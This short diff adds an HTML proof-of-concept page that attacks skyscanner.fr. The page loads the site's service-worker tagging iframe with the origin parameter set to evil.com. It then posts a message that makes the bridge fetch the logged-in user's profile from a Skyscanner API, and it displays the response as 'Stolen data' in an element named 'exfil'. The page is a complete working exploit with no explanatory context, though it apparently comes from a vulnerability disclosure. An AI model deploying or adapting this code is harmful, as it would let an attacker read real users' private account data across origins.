@@ -1,1 +1,23 @@
+<iframe id="bridge" src="https://www.skyscanner.fr/g/tagging/_/service_worker/63b0/sw_iframe.html?origin=https://evil.com"></iframe>
+<script>
+  window.addEventListener("message", function(e) {
+    // Receives credentialed response from skyscanner.fr
+    console.log("Stolen data:", e.data);
+    document.getElementById("exfil").textContent = JSON.stringify(e.data);
+  });
 
+  setTimeout(function() {
+    document.getElementById("bridge").contentWindow.postMessage({
+      type: 1,
+      command: {
+        commandType: 0,
+        params: {
+          url: "https://www.skyscanner.fr/sttc/api/user/profile",
+          processResponse: true,
+          method: 0
+        }
+      }
+    }, "https://www.skyscanner.fr");
+  }, 3000); // Wait for SW registration
+</script>
+<pre id="exfil"></pre>
